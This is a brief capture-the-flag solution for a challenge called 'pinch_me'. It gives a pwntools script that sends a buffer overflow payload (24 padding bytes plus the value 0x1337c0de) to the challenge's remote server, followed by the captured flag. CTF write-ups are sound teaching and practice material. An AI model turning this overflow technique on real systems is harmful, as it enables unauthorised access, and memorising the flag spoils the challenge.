## ***PINCH_ME***

```py
from pwn import *

binary = context.binary = ELF('./pinch_me')
p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

payload  = b''
payload += b'A' * 24
payload += p64(0x1337c0de)

p.sendlineafter('?\n',payload)
p.interactive()
```
Flag : ``***dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}``***
